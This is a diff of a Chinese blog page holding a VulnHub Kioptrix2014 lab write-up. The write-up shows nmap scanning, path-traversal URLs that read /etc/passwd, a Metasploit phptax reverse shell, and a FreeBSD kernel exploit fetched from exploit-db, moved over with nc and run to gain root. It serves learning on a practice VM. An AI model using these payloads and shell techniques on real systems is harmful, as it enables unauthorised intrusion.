@@ -79,7 +79,7 @@
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gcch3f5dizj30zo0na7b1.jpg">
 <meta property="article:published_time" content="2020-02-27T07:28:41.000Z">
 <meta property="article:modified_time" content="2021-08-06T03:57:59.187Z">
-<meta property="article:author" content="Dana Shaw">
+<meta property="article:author" content="肖坤稼">
 <meta property="article:tag" content="vulnhub靶机练习">
 <meta property="article:tag" content="Kioptix2014">
 <meta name="twitter:card" content="summary">
@@ -156,7 +156,8 @@
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
-        <p class="site-subtitle">为了去往别处</p>
+        <h1 class="site-subtitle" itemprop="description">为了去往别处</h1>
+      
   </div>
 
   <div class="site-nav-toggle">
@@ -231,9 +232,7 @@
     <i class="fa fa-search"></i>
   </span>
   <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="none"
-           placeholder="搜索..." spellcheck="false"
-           type="text" id="search-input">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="搜索..." spellcheck="false" type="text" id="search-input">
   </div>
   <span class="popup-btn-close">
     <i class="fa fa-times-circle"></i>
@@ -273,7 +272,7 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/./images/photo.jpg">
-      <meta itemprop="name" content="Dana Shaw">
+      <meta itemprop="name" content="肖坤稼">
       <meta itemprop="description" content="连尘埃也想收藏">
     </span>
 
@@ -281,9 +280,9 @@
       <meta itemprop="name" content="Dana Shaw's blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
+        <h2 class="post-title" itemprop="name headline">
           vulnhub靶机练习之Kioptrix2014
-        </h1>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -347,18 +346,18 @@
       
         <h2 id="探测靶机"><a href="#探测靶机" class="headerlink" title="探测靶机"></a>探测靶机</h2><p>修改vmdx文件，将<code>ethernet0.connectionType = &quot;bridged&quot;</code>改为<code>ethernet0.connectionType = &quot;nat&quot;</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcazov7krkj313d0lldh9.jpg" alt="image.png"><br>改了网卡连接模式之后，居然还是探测不到这个靶机的IP。</p>
 <p><escape> <span id="more"></span></escape></p>
-<p>在网上找了很久，终于找到一个<a target="_blank" rel="noopener" href="https://www.icekam.com/post/kioptrix-2014-5-vulnhub-ctf-penetration-test-record/">有效方法</a>。在打开靶机之前，删除网卡，重新添加网卡。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcb2iho01vj30nw0q3jsg.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcb2kcwuorj30nw0q33zy.jpg" alt="image.png"><br>官方文档也说了这个靶机使用之前要删除网卡重新添加网卡😥😥😥<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcb3vc7sjuj31f60u01cv.jpg" alt="image.png"><br>我们使用<code>sudo arp-scan -l</code>扫描得到靶机IP：192.168.80.20。</p>
+<p>在网上找了很久，终于找到一个<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.icekam.com/post/kioptrix-2014-5-vulnhub-ctf-penetration-test-record/">有效方法</a>。在打开靶机之前，删除网卡，重新添加网卡。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcb2iho01vj30nw0q3jsg.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcb2kcwuorj30nw0q33zy.jpg" alt="image.png"><br>官方文档也说了这个靶机使用之前要删除网卡重新添加网卡😥😥😥<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcb3vc7sjuj31f60u01cv.jpg" alt="image.png"><br>我们使用<code>sudo arp-scan -l</code>扫描得到靶机IP：192.168.80.20。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo arp-scan -l</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:b2:07:af, IPv4: 192.168.80.14</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.80.1    00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.80.2    00:50:56:fc:96:a7       VMware, Inc.</span><br><span class="line">192.168.80.17   00:0c:29:fe:3a:82       VMware, Inc.</span><br><span class="line">192.168.80.20   00:0c:29:c1:0a:95       VMware, Inc.</span><br><span class="line">192.168.80.254  00:50:56:f8:e1:4e       VMware, Inc.</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.436 seconds (105.09 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>
 <h2 id="使用nmap扫描"><a href="#使用nmap扫描" class="headerlink" title="使用nmap扫描"></a>使用nmap扫描</h2><p>输入命令（<code>sudo nmap -A -T5 -sS 192.168.80.20</code>）扫描，发现靶机开启的服务端口有：22（ssh端口）、80（http端口）、8080（http端口）。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -A -T5 -sS 192.168.80.20</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-27 04:32 EST</span><br><span class="line">Nmap scan report for 192.168.80.20</span><br><span class="line">Host is up (0.0033s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE  SERVICE VERSION</span><br><span class="line">22/tcp   closed ssh</span><br><span class="line">80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</span><br><span class="line">8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</span><br><span class="line">MAC Address: 00:0C:29:C1:0A:95 (VMware)</span><br><span class="line">Device type: general purpose|specialized|storage-misc</span><br><span class="line">Running (JUST GUESSING): FreeBSD 9.X|10.X|7.X|8.X|6.X (93%), AVtech embedded (91%), Linux 2.6.X (90%)</span><br><span class="line">OS CPE: cpe:/o:freebsd:freebsd:9 cpe:/o:freebsd:freebsd:10 cpe:/o:linux:linux_kernel:2.6 cpe:/o:freebsd:freebsd:7 cpe:/o:freebsd:freebsd:8 cpe:/o:freebsd:freebsd:6.2 cpe:/a:nas4free:nas4free cpe:/o:freebsd:freebsd:10.2</span><br><span class="line">Aggressive OS guesses: FreeBSD 9.0-RELEASE - 10.3-RELEASE (93%), FreeBSD 9.3-RELEASE (91%), AVtech Room Alert 26W environmental monitor (91%), Linux 2.6.18 - 2.6.22 (90%), FreeBSD 9.0-RELEASE (90%), FreeBSD 7.0-RELEASE - 9.0-RELEASE (88%), FreeBSD 7.0-RELEASE (87%), FreeBSD 7.1-PRERELEASE 7.2-STABLE (87%), FreeBSD 7.2-RELEASE - 8.0-RELEASE (87%), FreeBSD 9.1-RELEASE or 10.1-RELEASE (87%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   3.33 ms 192.168.80.20</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 58.65 seconds</span><br></pre></td></tr></table></figure>
-<h2 id="80端口进入网站页面"><a href="#80端口进入网站页面" class="headerlink" title="80端口进入网站页面"></a>80端口进入网站页面</h2><p>浏览器输入url：192.168.80.20，可以打开页面，看到页面内容只有”It works”。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gccgqmxpeqj30zh0nidh0.jpg" alt="image.png"><br>查看网页源代码，发现注释内容包含了网站的url地址：pChart2.1.3/index.php。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gccgsnncfzj30zl0ncjt1.jpg" alt="image.png"><br>我们访问这个url地址：<a target="_blank" rel="noopener" href="http://192.168.80.20/pChart2.1.3/examples/index.php">http://192.168.80.20/pChart2.1.3/examples/index.php</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gccgu4njsnj30zm0mdmzw.jpg" alt="image.png"><br>我们查找pChart2.1.3的漏洞信息，发现它存在目录穿越漏洞。<br>扫盲：pChart是什么？</p>
+<h2 id="80端口进入网站页面"><a href="#80端口进入网站页面" class="headerlink" title="80端口进入网站页面"></a>80端口进入网站页面</h2><p>浏览器输入url：192.168.80.20，可以打开页面，看到页面内容只有”It works”。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gccgqmxpeqj30zh0nidh0.jpg" alt="image.png"><br>查看网页源代码，发现注释内容包含了网站的url地址：pChart2.1.3/index.php。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gccgsnncfzj30zl0ncjt1.jpg" alt="image.png"><br>我们访问这个url地址：<a target="_blank" rel="external nofollow noopener noreferrer" href="http://192.168.80.20/pChart2.1.3/examples/index.php">http://192.168.80.20/pChart2.1.3/examples/index.php</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gccgu4njsnj30zm0mdmzw.jpg" alt="image.png"><br>我们查找pChart2.1.3的漏洞信息，发现它存在目录穿越漏洞。<br>扫盲：pChart是什么？</p>
 <blockquote>
 <p>pChart是一个开源的图表生成库，主要有3个Class：pChart.class、 pData.class、pCache.class，可生成20多种简单或复杂的图表，支持PNG、JPG、GIF通用图片格式。数据源可以来自于Database、CSV等。使用pChart需要开启<strong>PHP的GD服务</strong>。</p>
 </blockquote>
-<h3 id="目录穿越漏洞利用"><a href="#目录穿越漏洞利用" class="headerlink" title="目录穿越漏洞利用"></a>目录穿越漏洞利用</h3><p>输入url：<a target="_blank" rel="noopener" href="http://192.168.80.20/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd">http://192.168.80.20/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gccgwpmxjcj30zj0n577n.jpg" alt="image.png"><br>输入url：<a target="_blank" rel="noopener" href="http://192.168.80.20/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf">http://192.168.80.20/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf</a><br>查看http服务的配置文件，发现8080端口的服务只能使用Mozilla4浏览器访问。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gccgyfrjvej30zn0nkgon.jpg" alt="image.png"><br>于是我们使用浏览器插件<code>User-Agent Switcher and Manager</code>设置浏览器的UA为<code>Mozilla/4.0 (compatible; MSIE 4.01; Windows NT 5.0)</code>，就可以访问到192.168.80.20:8080的网页了。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcch0nd67fj30zf0nadj3.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcch2w13rzj30zo0nb0tu.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcch3f5dizj30zo0na7b1.jpg" alt="image.png"></p>
+<h3 id="目录穿越漏洞利用"><a href="#目录穿越漏洞利用" class="headerlink" title="目录穿越漏洞利用"></a>目录穿越漏洞利用</h3><p>输入url：<a target="_blank" rel="external nofollow noopener noreferrer" href="http://192.168.80.20/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd">http://192.168.80.20/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gccgwpmxjcj30zj0n577n.jpg" alt="image.png"><br>输入url：<a target="_blank" rel="external nofollow noopener noreferrer" href="http://192.168.80.20/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf">http://192.168.80.20/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf</a><br>查看http服务的配置文件，发现8080端口的服务只能使用Mozilla4浏览器访问。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gccgyfrjvej30zn0nkgon.jpg" alt="image.png"><br>于是我们使用浏览器插件<code>User-Agent Switcher and Manager</code>设置浏览器的UA为<code>Mozilla/4.0 (compatible; MSIE 4.01; Windows NT 5.0)</code>，就可以访问到192.168.80.20:8080的网页了。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcch0nd67fj30zf0nadj3.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcch2w13rzj30zo0nb0tu.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcch3f5dizj30zo0na7b1.jpg" alt="image.png"></p>
 <h3 id="phptax漏洞利用"><a href="#phptax漏洞利用" class="headerlink" title="phptax漏洞利用"></a>phptax漏洞利用</h3><ul>
 <li>利用metasploit的msfconsole进入www的shell<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/http/phptax_exec) &gt; search phptax</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                            Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                            ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/multi/http/phptax_exec  2012-10-08       excellent  Yes    PhpTax pfilez Parameter Exec Remote Code Injection</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/http/phptax_exec) &gt; use exploit/multi/http/phptax_exec </span><br><span class="line">msf5 exploit(multi/http/phptax_exec) &gt; set rhost 192.168.80.20</span><br><span class="line">rhost =&gt; 192.168.80.20</span><br><span class="line">msf5 exploit(multi/http/phptax_exec) &gt; set rport 8080</span><br><span class="line">rport =&gt; 8080</span><br><span class="line">msf5 exploit(multi/http/phptax_exec) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 192.168.80.14:4444 </span><br><span class="line">[*] 192.168.80.208080 - Sending request...</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: echo 0IWlXDD6mroOHlbm;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket A</span><br><span class="line">[*] A: &quot;Connected: not found\r\nEscape: not found\r\n0IWlXDD6mroOHlbm\r\n&quot;</span><br><span class="line">[*] Command: echo YmB6B5cAUuGNENTP;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket A</span><br><span class="line">[*] A: &quot;Connected: not found\r\nEscape: not found\r\nYmB6B5cAUuGNENTP\r\n&quot;</span><br><span class="line">[*] Matching...</span><br><span class="line">[*] B is input...</span><br><span class="line">[*] Matching...</span><br><span class="line">[*] B is input...</span><br><span class="line">[*] Command shell session 14 opened (192.168.80.14:4444 -&gt; 192.168.80.20:56563) at 2020-02-28 09:17:27 -0500</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www</span><br><span class="line">uname -a</span><br><span class="line">FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64</span><br></pre></td></tr></table></figure></li>
-<li>提权root<br>我们根据<code>uname -a</code>的结果，查找到FreeBSD 9.0存在内核漏洞，在<a target="_blank" rel="noopener" href="https://www.exploit-db.com/download/28718">网上</a>找到exp脚本，并执行exp利用漏洞。<ul>
+<li>提权root<br>我们根据<code>uname -a</code>的结果，查找到FreeBSD 9.0存在内核漏洞，在<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.exploit-db.com/download/28718">网上</a>找到exp脚本，并执行exp利用漏洞。<ul>
 <li>攻击机<br>下载exp到本地，将exp脚本命名为<code>vvv.c</code>。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ wget https://www.exploit-db.com/download/28718</span><br><span class="line">kali@kali:~$ mv 28718 vvv.c</span><br></pre></td></tr></table></figure>
 监听端口6666：<br>kali@kali:~$ nc -lvp 6666 &lt; vvv.c </li>
 <li>靶机<br>利用刚刚www的shell，通过6666端口从攻击机下载exp到本地，并执行exp脚本。（注意：<code>nc -nv 192.168.80.14 6666 -w 5 &gt; vvv.c</code>中的<code>w</code>是设置超时时间，<code>-w 5</code>意思就是超时时间设置为5秒。设置超时时间是为了确保从攻击机成功下载exp。）<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 192.168.80.14 6666 -w 5 &gt; vvv.c</span><br><span class="line">Connection to 192.168.80.14 6666 port [tcp/*] succeeded!</span><br><span class="line">gcc vvv.c</span><br><span class="line">vvv.c:178:2: warning: no newline at end of file</span><br><span class="line">./a.out</span><br><span class="line">[+] SYSRET FUCKUP!!</span><br><span class="line">[+] Start Engine...</span><br><span class="line">[+] Crotz...</span><br><span class="line">[+] Crotz...</span><br><span class="line">[+] Crotz...</span><br><span class="line">[+] Woohoo!!!</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
@@ -368,7 +367,7 @@
 </li>
 </ul>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要学习了靶机从攻击机下载exp脚本的方法，以及目录穿越漏洞的利用方式。对于插件版本、内核版本要格外留意，在网上查找对应版本是否存在漏洞可利用。nc命令要熟练运用，这个命令常用于反弹shell。</p>
-<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a target="_blank" rel="noopener" href="https://kongwenbin.wordpress.com/2016/11/02/writeup-for-kioptrix-2014-5/">https://kongwenbin.wordpress.com/2016/11/02/writeup-for-kioptrix-2014-5/</a></p>
+<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://kongwenbin.wordpress.com/2016/11/02/writeup-for-kioptrix-2014-5/">https://kongwenbin.wordpress.com/2016/11/02/writeup-for-kioptrix-2014-5/</a></p>
 
     </div>
 
@@ -380,21 +379,21 @@
 <div>
 <ul class="post-copyright">
   <li class="post-copyright-author">
-    <strong>本文作者： </strong>Dana Shaw
+    <strong>本文作者： </strong>肖坤稼
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
     <a href="https://dana5haw.com/posts/ZH-CN/Vulnhub_Kioptrix_2014.html" title="vulnhub靶机练习之Kioptrix2014">https://dana5haw.com/posts/ZH-CN/Vulnhub_Kioptrix_2014.html</a>
   </li>
   <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
   </li>
 
   <div class="wechat_OA">
 	<span>欢迎关注我的公众号(Welcome to follow me on Wechat)</span>
 	<br>
     <!-- 这里添加你的二维码图片 -->
-	<img src ="https://v2ray.dana5haw.com:8008/images/2021/08/03/qrcode_for_gh_9b7280eb1edc_258.jpg">
+	<img src="https://v2ray.dana5haw.com:8008/images/2021/08/03/qrcode_for_gh_9b7280eb1edc_258.jpg">
 </div>
 
 </ul>
@@ -495,18 +494,17 @@
       <div class="post-toc-wrap sidebar-panel">
           <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B%E9%9D%B6%E6%9C%BA"><span class="nav-number">1.</span> <span class="nav-text">探测靶机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8nmap%E6%89%AB%E6%8F%8F"><span class="nav-number">2.</span> <span class="nav-text">使用nmap扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#80%E7%AB%AF%E5%8F%A3%E8%BF%9B%E5%85%A5%E7%BD%91%E7%AB%99%E9%A1%B5%E9%9D%A2"><span class="nav-number">3.</span> <span class="nav-text">80端口进入网站页面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.1.</span> <span class="nav-text">目录穿越漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phptax%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.2.</span> <span class="nav-text">phptax漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E5%8D%9A%E6%96%87"><span class="nav-number">5.</span> <span class="nav-text">参考博文</span></a></li></ol></div>
       </div>
-        <div id="">
+        <div id>
 	  <canvas id="canvas" style="width:60%;">
-	    </div>
+	    </canvas></div>
 	      <script type="text/javascript" src="/js/canvas-dance-time.js"></script>
       <!--/noindex-->
 
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Dana Shaw"
-      src="/./images/photo.jpg">
-  <p class="site-author-name" itemprop="name">Dana Shaw</p>
+    <img class="site-author-image" itemprop="image" alt="肖坤稼" src="/./images/photo.jpg">
+  <p class="site-author-name" itemprop="name">肖坤稼</p>
   <div class="site-description" itemprop="description">连尘埃也想收藏</div>
 </div>
 <div class="site-state-wrap motion-element">
@@ -514,7 +512,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">255</span>
+          <span class="site-state-item-count">256</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -534,13 +532,13 @@
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-        <a href="https://github.com/DanaShaw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DanaShaw" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+        <a href="https://github.com/DanaShaw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DanaShaw" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
       </span>
       <span class="links-of-author-item">
-        <a href="mailto:danaxkj@gmail.com" title="E-Mail → mailto:danaxkj@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+        <a href="mailto:danaxkj@gmail.com" title="E-Mail → mailto:danaxkj@gmail.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
       </span>
       <span class="links-of-author-item">
-        <a href="https://weibo.com/u/5742631593" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5742631593" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+        <a href="https://weibo.com/u/5742631593" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5742631593" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
       </span>
       <span class="links-of-author-item">
         <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
@@ -555,7 +553,7 @@
     </div>
     <ul class="links-of-blogroll-list">
         <li class="links-of-blogroll-item">
-          <a href="https://whale3070.github.io/" title="https:&#x2F;&#x2F;whale3070.github.io&#x2F;" rel="noopener" target="_blank">windows提权学习</a>
+          <a href="https://whale3070.github.io/" title="https:&#x2F;&#x2F;whale3070.github.io&#x2F;" rel="external nofollow noopener noreferrer" target="_blank">windows提权学习</a>
         </li>
     </ul>
   </div>
@@ -602,7 +600,7 @@
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">Dana Shaw</span>
+  <span class="author" itemprop="copyrightHolder">肖坤稼</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
@@ -616,7 +614,7 @@
 </div>
 
 
-  <script src='https://unpkg.com/mermaid@/dist/mermaid.min.js'></script>
+  <script src="https://unpkg.com/mermaid@/dist/mermaid.min.js"></script>
   <script>
     if (window.mermaid) {
       mermaid.initialize({theme: 'default'});
@@ -658,7 +656,7 @@
 
   
   
-  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
   <script src="/lib/anime.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
   <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
@@ -681,6 +679,15 @@
 
 
   
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
 
 
 
@@ -737,15 +744,9 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
 });
 </script>
 
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3938956891324222"
-     crossorigin="anonymous"></script>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3938956891324222" crossorigin="anonymous"></script>
 <!-- sidebar -->
-<ins class="adsbygoogle"
-     style="display:block"
-     data-ad-client="ca-pub-3938956891324222"
-     data-ad-slot="6163650450"
-     data-ad-format="auto"
-     data-full-width-responsive="true"></ins>
+<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-3938956891324222" data-ad-slot="6163650450" data-ad-format="auto" data-full-width-responsive="true"></ins>
 <script>
      (adsbygoogle = window.adsbygoogle || []).push({});
 </script>
@@ -753,7 +754,7 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
   <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
   
   
-   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
